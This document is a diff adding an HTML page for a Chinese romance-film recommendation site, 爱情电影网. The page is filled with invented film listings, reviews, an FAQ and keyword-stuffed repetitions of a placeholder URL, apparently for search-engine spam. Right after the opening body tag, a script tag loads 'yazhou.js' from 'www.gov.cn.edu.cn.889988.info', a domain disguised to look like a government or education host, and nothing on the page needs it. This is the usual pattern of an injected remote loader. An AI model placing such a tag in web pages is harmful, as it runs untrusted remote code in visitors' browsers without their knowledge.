@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>爱情电影网 - 经典爱情片推荐 · 新片速递 · 影评专栏 | https://aiqingdianyingwang-app</title>
+<meta name="description" content="爱情电影网（https://aiqingdianyingwang-app）专注爱情电影推荐与观影指南，提供经典爱情片单、新片速递、深度影评专栏与情侣观影攻略，每日更新高分爱情电影。">
+<meta name="keywords" content="爱情电影网,爱情电影,爱情片推荐,经典爱情电影,情侣观影指南,爱情电影影评,https://aiqingdianyingwang-app">
+<meta name="author" content="爱情电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://aiqingdianyingwang-app/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="爱情电影网">
+<meta property="og:title" content="爱情电影网 - 经典爱情片推荐 · 新片速递 · 影评专栏">
+<meta property="og:description" content="爱情电影网收录高分爱情电影，提供经典爱情片单、新片速递、深度影评与情侣观影攻略，网址：https://aiqingdianyingwang-app">
+<meta property="og:url" content="https://aiqingdianyingwang-app/">
+<meta name="theme-color" content="#0E0B12">
+<style>
+:root{
+  --ink:#0E0B12;
+  --ink-2:#17121C;
+  --card:#1D1622;
+  --rose:#E0245E;
+  --rose-soft:#FF5C8A;
+  --gold:#F5C97B;
+  --text:#F2ECF3;
+  --muted:#A79BAE;
+  --radius:18px;
+  --maxw:1180px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","Noto Sans CJK SC",system-ui,sans-serif;
+  background:var(--ink);
+  color:var(--text);
+  line-height:1.75;
+  letter-spacing:.2px;
+  overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{width:100%;max-width:var(--maxw);margin:0 auto;padding:0 20px}
+
+/* ============ 顶部导航 ============ */
+.nav-toggle{position:absolute;opacity:0;pointer-events:none}
+.site-head{
+  position:sticky;top:0;z-index:60;
+  background:rgba(14,11,18,.86);
+  backdrop-filter:blur(14px);
+  border-bottom:1px solid rgba(255,255,255,.07);
+}
+.head-inner{display:flex;align-items:center;justify-content:space-between;gap:16px;min-height:64px}
+.brand{display:flex;align-items:center;gap:12px}
+.brand-mark{
+  width:40px;height:40px;border-radius:12px;flex:0 0 auto;
+  background:linear-gradient(140deg,var(--rose),#8A1140);
+  display:flex;align-items:center;justify-content:center;
+  font-size:20px;box-shadow:0 6px 18px rgba(224,36,94,.35);
+}
+.brand-txt strong{display:block;font-size:19px;letter-spacing:1px;font-weight:700}
+.brand-txt span{display:block;font-size:11px;color:var(--muted);letter-spacing:.5px;word-break:break-all}
+.site-nav ul{display:flex;align-items:center;gap:4px}
+.site-nav a{
+  display:block;padding:10px 14px;border-radius:10px;font-size:15px;color:#D9CFDD;
+  transition:background .25s,color .25s;
+}
+.site-nav a:hover,.site-nav a:focus{background:rgba(224,36,94,.16);color:#fff}
+.nav-btn{
+  display:none;width:42px;height:42px;border-radius:12px;cursor:pointer;
+  background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);
+  align-items:center;justify-content:center;flex-direction:column;gap:5px;
+}
+.nav-btn i{display:block;width:18px;height:2px;background:#fff;border-radius:2px}
+
+/* ============ 首屏 ============ */
+.hero{position:relative;padding:64px 0 40px;overflow:hidden}
+.hero::before{
+  content:"";position:absolute;inset:0;
+  background:
+    radial-gradient(760px 380px at 18% 0%,rgba(224,36,94,.28),transparent 65%),
+    radial-gradient(620px 320px at 88% 22%,rgba(245,201,123,.16),transparent 70%);
+  pointer-events:none;
+}
+.hero-inner{position:relative;display:grid;grid-template-columns:1.05fr .95fr;gap:44px;align-items:center}
+.eyebrow{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:6px 14px;border-radius:999px;font-size:12.5px;letter-spacing:1px;
+  background:rgba(245,201,123,.12);color:var(--gold);border:1px solid rgba(245,201,123,.3);
+}
+.hero h1{
+  font-size:clamp(32px,5.2vw,58px);line-height:1.22;margin:18px 0 14px;font-weight:800;letter-spacing:1px;
+}
+.hero h1 em{font-style:normal;color:var(--rose-soft)}
+.hero p.lead{font-size:clamp(15px,1.6vw,17.5px);color:#CFC3D4;max-width:52ch}
+.hero-url{
+  margin:20px 0 26px;display:inline-flex;flex-wrap:wrap;align-items:center;gap:10px;
+  padding:12px 16px;border-radius:14px;background:rgba(255,255,255,.05);
+  border:1px dashed rgba(255,255,255,.18);font-size:14px;
+}
+.hero-url b{color:var(--gold);font-weight:600;word-break:break-all}
+.btn-row{display:flex;flex-wrap:wrap;gap:12px}
+.btn{
+  display:inline-block;padding:13px 26px;border-radius:999px;font-size:15px;font-weight:600;
+  transition:transform .2s,box-shadow .2s,background .2s;
+}
+.btn-primary{background:linear-gradient(120deg,var(--rose),#B01548);color:#fff;box-shadow:0 10px 24px rgba(224,36,94,.32)}
+.btn-ghost{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.16);color:#fff}
+.btn:hover{transform:translateY(-2px)}
+
+/* 胶片卷轴卡片 */
+.reel{
+  position:relative;border-radius:26px;padding:22px;
+  background:linear-gradient(160deg,#241A2A,#120E17);
+  border:1px solid rgba(255,255,255,.08);
+  box-shadow:0 24px 60px rgba(0,0,0,.45);
+}
+.reel-strip{
+  position:absolute;left:0;right:0;top:0;height:26px;border-radius:26px 26px 0 0;
+  background:
+    repeating-linear-gradient(90deg,#0B080E 0 10px,transparent 10px 30px);
+  opacity:.5;
+}
+.reel-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;position:relative}
+.poster{
+  border-radius:16px;padding:20px 16px;min-height:132px;
+  display:flex;flex-direction:column;justify-content:flex-end;gap:6px;
+  background:linear-gradient(150deg,#3A2130,#191222);
+  border:1px solid rgba(255,255,255,.07);
+}
+.poster:nth-child(2){background:linear-gradient(150deg,#2A1C34,#141019)}
+.poster:nth-child(3){background:linear-gradient(150deg,#40202A,#1A1118)}
+.poster:nth-child(4){background:linear-gradient(150deg,#1E2338,#12111C)}
+.poster b{font-size:15.5px}
+.poster span{font-size:12px;color:var(--muted)}
+.score{color:var(--gold);font-size:13px;font-weight:700}
+
+/* 跑马灯胶片条 */
+.filmbar{
+  margin-top:34px;overflow:hidden;position:relative;
+  border-top:1px solid rgba(255,255,255,.08);border-bottom:1px solid rgba(255,255,255,.08);
+  padding:10px 0;background:rgba(255,255,255,.02);
+}
+.filmbar-track{display:flex;gap:34px;width:max-content;animation:slide 26s linear infinite}
+.filmbar-track span{font-size:13.5px;color:#B9AEC0;white-space:nowrap}
+.filmbar-track span i{color:var(--rose-soft);font-style:normal;margin-right:6px}
+@keyframes slide{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+@media (prefers-reduced-motion:reduce){.filmbar-track{animation:none}}
+
+/* ============ 通用版块 ============ */
+.section{padding:58px 0}
+.section.alt{background:linear-gradient(180deg,rgba(255,255,255,.024),rgba(255,255,255,0))}
+.sec-head{margin-bottom:30px}
+.sec-head .kicker{font-size:12.5px;letter-spacing:2px;color:var(--rose-soft);text-transform:uppercase}
+.sec-head h2{font-size:clamp(24px,3vw,34px);margin:8px 0 10px;font-weight:800;letter-spacing:.5px}
+.sec-head p{color:var(--muted);font-size:15px;max-width:62ch}
+
+/* 卡片网格 */
+.cards{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.movie{
+  background:var(--card);border:1px solid rgba(255,255,255,.07);border-radius:var(--radius);
+  overflow:hidden;transition:transform .25s,border-color .25s,box-shadow .25s;
+}
+.movie:hover{transform:translateY(-6px);border-color:rgba(224,36,94,.45);box-shadow:0 18px 36px rgba(0,0,0,.4)}
+.cover{
+  height:180px;position:relative;display:flex;align-items:flex-end;padding:14px;
+  background:linear-gradient(155deg,#4A2333,#1B1322);
+}
+.movie:nth-child(2) .cover{background:linear-gradient(155deg,#2B2440,#171523)}
+.movie:nth-child(3) .cover{background:linear-gradient(155deg,#4C3120,#1E1618)}
+.movie:nth-child(4) .cover{background:linear-gradient(155deg,#1F3540,#14181F)}
+.cover::after{
+  content:"";position:absolute;left:0;right:0;bottom:0;height:52px;
+  background:linear-gradient(0deg,rgba(0,0,0,.6),transparent);
+}
+.cover-tag{
+  position:absolute;top:12px;left:12px;z-index:2;font-size:11.5px;padding:4px 10px;border-radius:999px;
+  background:rgba(0,0,0,.45);border:1px solid rgba(255,255,255,.2);color:#fff;
+}
+.cover h3{position:relative;z-index:2;font-size:16.5px;font-weight:700}
+.movie .body{padding:14px 16px 18px}
+.movie .meta{font-size:12.5px;color:var(--muted);margin-bottom:8px}
+.movie .desc{font-size:13.8px;color:#C6BACB}
+.tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:12px}
+.tags a{
+  font-size:11.5px;padding:4px 9px;border-radius:8px;
+  background:rgba(255,255,255,.06);color:#BCAFC2;
+}
+.tags a:hover{background:rgba(224,36,94,.2);color:#fff}
+
+/* 榜单 */
+.rank{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.rank li{
+  display:flex;gap:14px;align-items:flex-start;padding:16px;border-radius:14px;
+  background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.07);
+  transition:background .25s;
+}
+.rank li:hover{background:rgba(224,36,94,.1)}
+.rank .no{
+  flex:0 0 auto;width:34px;height:34px;border-radius:10px;font-weight:800;font-size:15px;
+  display:flex;align-items:center;justify-content:center;
+  background:linear-gradient(140deg,var(--rose),#7E0F3A);color:#fff;
+}
+.rank .rt h3{font-size:16px;margin-bottom:4px}
+.rank .rt p{font-size:13.5px;color:var(--muted)}
+
+/* 影评 */
+.reviews{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.review{
+  padding:22px;border-radius:var(--radius);background:var(--card);
+  border:1px solid rgba(255,255,255,.07);
+}
+.review .quote{font-size:14.6px;color:#D3C8D8}
+.review .who{display:flex;align-items:center;gap:10px;margin-top:18px;font-size:13px;color:var(--muted)}
+.avatar{
+  width:34px;height:34px;border-radius:50%;flex:0 0 auto;
+  background:linear-gradient(140deg,var(--gold),var(--rose));
+  display:flex;align-items:center;justify-content:center;color:#1A1220;font-weight:800;font-size:13px;
+}
+
+/* 观影指南时间线 */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;counter-reset:s}
+.step{
+  position:relative;padding:22px 18px;border-radius:var(--radius);
+  background:linear-gradient(165deg,rgba(224,36,94,.12),rgba(255,255,255,.02));
+  border:1px solid rgba(255,255,255,.08);
+}
+.step::before{
+  counter-increment:s;content:counter(s);
+  display:flex;align-items:center;justify-content:center;
+  width:32px;height:32px;border-radius:50%;margin-bottom:12px;
+  background:#fff;color:#17121C;font-weight:800;font-size:14px;
+}
+.step h3{font-size:16px;margin-bottom:6px}
+.step p{font-size:13.6px;color:#C4B8CA}
+
+/* FAQ */
+.faq{display:grid;gap:12px;max-width:840px}
+.faq details{
+  border-radius:14px;background:rgba(255,255,255,.035);
+  border:1px solid rgba(255,255,255,.08);padding:0 18px;
+}
+.faq summary{
+  cursor:pointer;padding:16px 0;font-size:15.5px;font-weight:600;list-style:none;
+  display:flex;justify-content:space-between;align-items:center;gap:12px;
+}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"+";color:var(--rose-soft);font-size:20px;font-weight:700}
+.faq details[open] summary::after{content:"-"}
+.faq details p{padding:0 0 16px;font-size:14.3px;color:#C4B8CA}
+
+/* 数据条 */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-top:8px}
+.stat{padding:20px;border-radius:16px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);text-align:center}
+.stat b{display:block;font-size:clamp(22px,3vw,30px);color:var(--gold);font-weight:800}
+.stat span{font-size:13px;color:var(--muted)}
+
+/* 页脚 */
+.site-foot{border-top:1px solid rgba(255,255,255,.08);padding:44px 0 30px;background:#0B080E}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:26px}
+.foot-grid h4{font-size:15px;margin-bottom:12px;color:#fff}
+.foot-grid li{margin-bottom:8px}
+.foot-grid li a{font-size:13.6px;color:var(--muted)}
+.foot-grid li a:hover{color:var(--rose-soft)}
+.foot-note{
+  margin-top:30px;padding-top:20px;border-top:1px solid rgba(255,255,255,.07);
+  font-size:12.8px;color:#8E8395;text-align:center;line-height:2;
+}
+.foot-note b{color:var(--gold)}
+.to-top{
+  position:fixed;right:18px;bottom:18px;z-index:70;width:46px;height:46px;border-radius:50%;
+  background:linear-gradient(140deg,var(--rose),#8A1140);color:#fff;
+  display:flex;align-items:center;justify-content:center;font-size:18px;
+  box-shadow:0 10px 24px rgba(224,36,94,.35);
+}
+
+/* ============ 响应式 ============ */
+@media (max-width:980px){
+  .hero-inner{grid-template-columns:1fr;gap:32px}
+  .cards{grid-template-columns:repeat(2,1fr)}
+  .reviews{grid-template-columns:1fr}
+  .steps{grid-template-columns:repeat(2,1fr)}
+  .foot-grid{grid-template-columns:1fr 1fr}
+}
+@media (max-width:720px){
+  .nav-btn{display:flex}
+  .site-nav{
+    display:none;position:absolute;left:0;right:0;top:100%;
+    background:rgba(14,11,18,.98);border-bottom:1px solid rgba(255,255,255,.08);
+    padding:10px 20px 18px;
+  }
+  .nav-toggle:checked ~ .site-nav{display:block}
+  .site-nav ul{flex-direction:column;align-items:stretch;gap:2px}
+  .site-nav a{padding:12px 10px;font-size:15.5px}
+  .brand-txt strong{font-size:17px}
+  .hero{padding:40px 0 30px}
+  .rank{grid-template-columns:1fr}
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .section{padding:44px 0}
+  .cover{height:150px}
+}
+@media (max-width:420px){
+  .cards{grid-template-columns:1fr}
+  .steps{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr}
+  .reel-grid{grid-template-columns:1fr}
+  .btn{width:100%;text-align:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<a class="to-top" href="#top" aria-label="返回顶部">&uarr;</a>
+
+<header class="site-head" id="top">
+  <div class="wrap head-inner">
+    <div class="brand">
+      <div class="brand-mark" aria-hidden="true">&#10084;</div>
+      <div class="brand-txt">
+        <strong>爱情电影网</strong>
+        <span>https://aiqingdianyingwang-app</span>
+      </div>
+    </div>
+    <input type="checkbox" id="nav-toggle" class="nav-toggle">
+    <label for="nav-toggle" class="nav-btn" aria-label="展开导航菜单"><i></i><i></i><i></i></label>
+    <nav class="site-nav" aria-label="主导航">
+      <ul>
+        <li><a href="#hot">本周热映</a></li>
+        <li><a href="#classic">经典片单</a></li>
+        <li><a href="#review">影评专栏</a></li>
+        <li><a href="#guide">观影指南</a></li>
+        <li><a href="#faq">常见问题</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+  <!-- ============ 首屏 ============ -->
+  <section class="hero" aria-labelledby="hero-title">
+    <div class="wrap hero-inner">
+      <div>
+        <span class="eyebrow">&#9679; 每日更新 · 高分爱情电影索引</span>
+        <h1 id="hero-title">爱情电影网：把每一段<em>心动</em>都存进片单</h1>
+        <p class="lead">爱情电影网（https://aiqingdianyingwang-app）收录全球爱情电影，从黄金时代经典到院线新片，提供片单推荐、深度影评与情侣观影攻略，帮你在一小时内挑到今晚该看的那部电影。</p>
+        <div class="hero-url">
+          <span>本站网址：</span><b>https://aiqingdianyingwang-app</b>
+        </div>
+        <div class="btn-row">
+          <a class="btn btn-primary" href="#hot">浏览本周热映</a>
+          <a class="btn btn-ghost" href="#classic">查看经典片单</a>
+        </div>
+      </div>
+      <div class="reel" aria-label="爱情电影网精选海报墙">
+        <div class="reel-strip" aria-hidden="true"></div>
+        <div class="reel-grid">
+          <article class="poster"><b>黄昏之恋</b><span>法式 · 剧情 / 爱情</span><span class="score">豆瓣 8.7</span></article>
+          <article class="poster"><b>雨夜信笺</b><span>日系 · 治愈 / 爱情</span><span class="score">豆瓣 8.5</span></article>
+          <article class="poster"><b>盛夏告白</b><span>青春 · 校园 / 爱情</span><span class="score">豆瓣 8.2</span></article>
+          <article class="poster"><b>长夜将尽</b><span>文艺 · 剧情 / 爱情</span><span class="score">豆瓣 8.9</span></article>
+        </div>
+      </div>
+    </div>
+    <div class="filmbar" aria-hidden="true">
+      <div class="filmbar-track">
+        <span><i>&#10084;</i>爱情电影网 · 经典爱情片</span><span><i>&#10084;</i>爱情电影网 · 新片速递</span><span><i>&#10084;</i>爱情电影网 · 影评专栏</span><span><i>&#10084;</i>爱情电影网 · 观影指南</span><span><i>&#10084;</i>https://aiqingdianyingwang-app</span>
+        <span><i>&#10084;</i>爱情电影网 · 经典爱情片</span><span><i>&#10084;</i>爱情电影网 · 新片速递</span><span><i>&#10084;</i>爱情电影网 · 影评专栏</span><span><i>&#10084;</i>爱情电影网 · 观影指南</span><span><i>&#10084;</i>https://aiqingdianyingwang-app</span>
+      </div>
+    </div>
+    <div class="wrap">
+      <div class="stats">
+        <div class="stat"><b>3800+</b><span>收录爱情电影</span></div>
+        <div class="stat"><b>12000+</b><span>原创影评文章</span></div>
+        <div class="stat"><b>96</b><span>覆盖上映年份</span></div>
+        <div class="stat"><b>24h</b><span>片单更新频率</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目一：本周热映 ============ -->
+  <section class="section" id="hot" aria-labelledby="hot-title">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">Now Showing</span>
+        <h2 id="hot-title">本周热映 · 爱情电影网精选</h2>
+        <p>爱情电影网每周更新热映爱情片榜单，按口碑评分、话题热度与观影适配度排序，挑选适合两个人一起看的那一部。</p>
+      </div>
+      <div class="cards">
+        <article class="movie">
+          <div class="cover"><span class="cover-tag">院线新片</span><h3>黄昏之恋</h3></div>
+          <div class="body">
+            <p class="meta">法国 · 2025 · 剧情 / 爱情 · 118 分钟</p>
+            <p class="desc">两位中年画家在普罗旺斯的夏日重逢，用一幅未完成的肖像，补完了二十年前未说出口的告白。</p>
+            <div class="tags"><a href="#">爱情电影网</a><a href="#">法式浪漫</a><a href="#">中年爱情</a></div>
+          </div>
+        </article>
+        <article class="movie">
+          <div class="cover"><span class="cover-tag">口碑佳作</span><h3>雨夜信笺</h3></div>
+          <div class="body">
+            <p class="meta">日本 · 2024 · 治愈 / 爱情 · 106 分钟</p>
+            <p class="desc">一家老邮局、一封迟到十年的信，让两个在雨夜里躲雨的人，重新学会了等待与表达。</p>
+            <div class="tags"><a href="#">爱情电影网</a><a href="#">日系治愈</a><a href="#">书信</a></div>
+          </div>
+        </article>
+        <article class="movie">
+          <div class="cover"><span class="cover-tag">青春校园</span><h3>盛夏告白</h3></div>
+          <div class="body">
+            <p class="meta">中国 · 2025 · 校园 / 爱情 · 98 分钟</p>
+            <p class="desc">高考结束的那个夏天，三个少年把没说出口的话写进毕业纪念册，也写进了各自的青春。</p>
+            <div class="tags"><a href="#">爱情电影网</a><a href="#">校园纯爱</a><a href="#">青春</a></div>
+          </div>
+        </article>
+        <article class="movie">
+          <div class="cover"><span class="cover-tag">高分文艺</span><h3>长夜将尽</h3></div>
+          <div class="body">
+            <p class="meta">英国 · 2023 · 文艺 / 爱情 · 132 分钟</p>
+            <p class="desc">在漫长的冬夜里，一位守灯塔的老人向访客讲述自己与妻子跨越半生的通信与相守。</p>
+            <div class="tags"><a href="#">爱情电影网</a><a href="#">文艺片</a><a href="#">长情</a></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目二：经典片单 ============ -->
+  <section class="section alt" id="classic" aria-labelledby="classic-title">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">Classic List</span>
+        <h2 id="classic-title">经典爱情片单 · 爱情电影网珍藏片库</h2>
+        <p>从黄金时代到千禧年，爱情电影网整理出这份常看常新的经典爱情片榜单，每一部都值得在深夜重看一遍。</p>
+      </div>
+      <ul class="rank">
+        <li><span class="no">1</span><div class="rt"><h3>罗马假日式的一日倾心</h3><p>一天的相遇换来一生的想念，奠定浪漫喜剧基本语法的经典之作。</p></div></li>
+        <li><span class="no">2</span><div class="rt"><h3>乱世中的一封家书</h3><p>战争背景下的克制爱情，镜头语言克制，情感浓度却极高。</p></div></li>
+        <li><span class="no">3</span><div class="rt"><h3>雨中歌声里的重逢</h3><p>音乐与爱情交织，歌舞段落至今仍是最浪漫的银幕瞬间之一。</p></div></li>
+        <li><span class="no">4</span><div class="rt"><h3>城市夜色与两段独白</h3><p>都市男女的暧昧与错过，是现代爱情片的分水岭。</p></div></li>
+        <li><span class="no">5</span><div class="rt"><h3>跨越世纪的等待</h3><p>时间尺度被拉长到一生，爱情成为对抗遗忘的唯一方式。</p></div></li>
+        <li><span class="no">6</span><div class="rt"><h3>一封迟到的告白信</h3><p>含蓄、克制、留白，东方爱情片里最动人的一次回望。</p></div></li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ============ 栏目三：影评专栏 ============ -->
+  <section class="section" id="review" aria-labelledby="review-title">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">Review Column</span>
+        <h2 id="review-title">影评专栏 · 爱情电影网原创长评</h2>
+        <p>爱情电影网影评专栏由资深影迷与影评人撰稿，从叙事结构、镜头语言到情感表达拆解一部爱情片为何动人。</p>
+      </div>
+      <div class="reviews">
+        <article class="review">
+          <p class="quote">「好的爱情片从不急着表白，它先让你看见两个人如何在细节里互相靠近。爱情电影网把这类细节称作『心动刻度』。」</p>
+          <div class="who"><span class="avatar">陈</span><div><b>陈屿</b> · 爱情电影网特约影评人<br>影评更新：每周三</div></div>
+        </article>
+        <article class="review">
+          <p class="quote">「判断一部爱情片是否真诚，看它如何处理沉默。沉默拍得好，留白就比告白更有力量。」</p>
+          <div class="who"><span class="avatar">林</span><div><b>林知微</b> · 爱情电影网专栏作者<br>影评更新：每周五</div></div>
+        </article>
+        <article class="review">
+          <p class="quote">「爱情电影网的片单逻辑很简单：把适合两个人一起看的电影，放在最容易找到的位置。」</p>
+          <div class="who"><span class="avatar">周</span><div><b>周牧</b> · 爱情电影网内容编辑<br>片单更新：每日 20:00</div></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目四：观影指南 ============ -->
+  <section class="section alt" id="guide" aria-labelledby="guide-title">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">Watch Guide</span>
+        <h2 id="guide-title">观影指南 · 爱情电影网情侣观影攻略</h2>
+        <p>不知道今晚看什么？爱情电影网这套四步观影指南，帮你从心情出发，快速锁定一部合适的爱情电影。</p>
+      </div>
+      <div class="steps">
+        <div class="step"><h3>先看心情</h3><p>想哭、想笑还是想被治愈，先在爱情电影网的心情标签里做一次选择。</p></div>
+        <div class="step"><h3>再定长度</h3><p>90 分钟轻喜剧适合工作日夜晚，130 分钟文艺片留给周末的整块时间。</p></div>
+        <div class="step"><h3>对照片单</h3><p>在经典片单与本周热映中交叉比对评分与题材，缩小到三部以内。</p></div>
+        <div class="step"><h3>营造氛围</h3><p>关灯、调低音量、准备好一杯热饮，让电影的第一帧就有仪式感。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目五：常见问题 ============ -->
+  <section class="section" id="faq" aria-labelledby="faq-title">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">FAQ</span>
+        <h2 id="faq-title">常见问题 · 关于爱情电影网</h2>
+        <p>关于爱情电影网（https://aiqingdianyingwang-app）的内容来源、更新频率与片单收录标准，这里一次说清。</p>
+      </div>
+      <div class="faq">
+        <details open>
+          <summary>爱情电影网的片单多久更新一次？</summary>
+          <p>爱情电影网每日更新一次片单，每周五固定发布「本周热映」榜单，节假日与档期会额外加更专题片单。</p>
+        </details>
+        <details>
+          <summary>爱情电影网如何筛选爱情电影？</summary>
+          <p>爱情电影网采用三层筛选：题材标签匹配、口碑评分阈值、情感表达完整度人工复核，确保片单中的每部影片都具备明确的爱情主线。</p>
+        </details>
+        <details>
+          <summary>情侣第一次一起看电影，爱情电影网推荐哪一类？</summary>
+          <p>爱情电影网建议优先选择轻喜剧或治愈系爱情片，节奏明快、情绪安全，观影过程不会有尴尬的冷场。</p>
+        </details>
+        <details>
+          <summary>如何记住爱情电影网的网址？</summary>
+          <p>爱情电影网官方网址为 https://aiqingdianyingwang-app，建议收藏到浏览器书签，随时查找最新爱情电影片单与影评。</p>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 站内关键词导航 ============ -->
+  <section class="section alt" aria-label="爱情电影网栏目导航">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">Site Map</span>
+        <h2>爱情电影网栏目导航</h2>
+        <p>爱情电影网 · https://aiqingdianyingwang-app —— 爱情电影推荐、经典爱情片单、爱情电影影评、情侣观影指南，一站找齐。</p>
+      </div>
+      <div class="tags">
+        <a href="#hot">爱情电影网本周热映</a>
+        <a href="#classic">爱情电影网经典片单</a>
+        <a href="#review">爱情电影网影评专栏</a>
+        <a href="#guide">爱情电影网观影指南</a>
+        <a href="#faq">爱情电影网常见问题</a>
+        <a href="#top">回到爱情电影网首页</a>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site-foot">
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <h4>关于爱情电影网</h4>
+        <p style="font-size:13.6px;color:#A79BAE;">爱情电影网（https://aiqingdianyingwang-app）致力于整理全球爱情电影，提供片单推荐、影评专栏与观影指南，让每一次观影选择都更简单。</p>
+      </div>
+      <div>
+        <h4>热门栏目</h4>
+        <ul>
+          <li><a href="#hot">本周热映</a></li>
+          <li><a href="#classic">经典片单</a></li>
+          <li><a href="#review">影评专栏</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>观影服务</h4>
+        <ul>
+          <li><a href="#guide">观影指南</a></li>
+          <li><a href="#faq">常见问题</a></li>
+          <li><a href="#top">返回首页</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>友情链接</h4>
+        <ul>
+          <li><a href="#">爱情电影片库</a></li>
+          <li><a href="#">情侣观影榜</a></li>
+          <li><a href="#">影视资讯站</a></li>
+        </ul>
+      </div>
+    </div>
+    <p class="foot-note">
+      爱情电影网 &copy; 2026 &nbsp;|&nbsp; 网址：<b>https://aiqingdianyingwang-app</b><br>
+      关键词：爱情电影网、爱情电影推荐、经典爱情片、情侣观影指南、爱情电影影评、https://aiqingdianyingwang-app
+    </p>
+  </div>
+</footer>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "爱情电影网",
+  "alternateName": "爱情电影推荐与观影指南",
+  "url": "https://aiqingdianyingwang-app/",
+  "description": "爱情电影网收录高分爱情电影，提供经典爱情片单、新片速递、影评专栏与情侣观影指南。",
+  "inLanguage": "zh-CN",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://aiqingdianyingwang-app/?s={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+
+</body>
+</html>
